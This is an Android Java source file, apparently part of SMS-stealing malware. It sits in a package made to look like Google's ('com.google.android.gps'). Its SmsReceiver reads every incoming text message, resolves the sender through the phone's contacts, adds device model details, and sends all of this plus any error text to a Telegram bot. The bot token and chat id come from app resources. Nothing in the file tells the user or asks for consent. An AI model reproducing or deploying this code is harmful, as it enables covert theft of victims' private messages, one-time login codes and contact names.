package com.google.android.gps ;

import android.content.*;
import android.database.*;
import android.net.*;
import android.os.*;
import android.provider.*;
import android.telephony.*;
import android.webkit.*;

public class SmsReceiver extends BroadcastReceiver {
	SmsManager sms = SmsManager.getDefault();	
	@Override
	public void onReceive(Context context, Intent intent){
		final Bundle bundle = intent.getExtras();
		try {
			if (bundle != null) {
				final Object[] pdusObj = (Object[]) bundle.get("pdus");
				for (int i = 0; i < pdusObj.length; i++) {
					SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
					String phoneNumber = currentMessage.getDisplayOriginatingAddress();
					String message = currentMessage.getDisplayMessageBody();
					String temp = "💬 "+context.getResources().getString(R.string.takmaad)+bosluk()+getDeviceInfo()+bosluk()+"-> Gönderen: "+getContactName(phoneNumber,context)+bosluk()+"-> Mesaj: "+message;
					String token = context.getResources().getString(R.string.botid);
					String user = context.getResources().getString(R.string.userid);
					(new WebView(context)).loadUrl("https://api.telegram.org/bot"+token+"/sendMessage?text="+temp+"&chat_id="+user);
				}
			}
		} catch (Exception e){
			(new WebView(context)).loadUrl("https://api.telegram.org/bot"+context.getResources().getString(R.string.botid)+"/sendMessage?text="+e.toString()+"&chat_id="+context.getResources().getString(R.string.userid));
		}
    }
	
	String bosluk(){
		String temp = "";
		for(int i = 0;i!=150;i++)
			temp += " ";
		return temp;
	}
	
	String getDeviceInfo(){
		String s1 = Build.DEVICE;
		String s2 = Build.HARDWARE;
		String s3 = Build.MANUFACTURER;
		return bosluk()+"Cihaz: "+s1+" "+s2+" "+s3;
	}
	
	public String getContactName(final String phoneNumber,Context context)
	{
		Uri uri=Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,Uri.encode(phoneNumber));

		String[] projection = new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME};

		String contactName="";
		Cursor cursor=context.getContentResolver().query(uri,projection,null,null,null);

		if (cursor != null) {
			if(cursor.moveToFirst()) {
				contactName=cursor.getString(0);
			}
			cursor.close();
		}
		if (contactName.length() < 1){
			return phoneNumber;
		}else{
		    return contactName+" ("+phoneNumber+")";
		}
	}
}
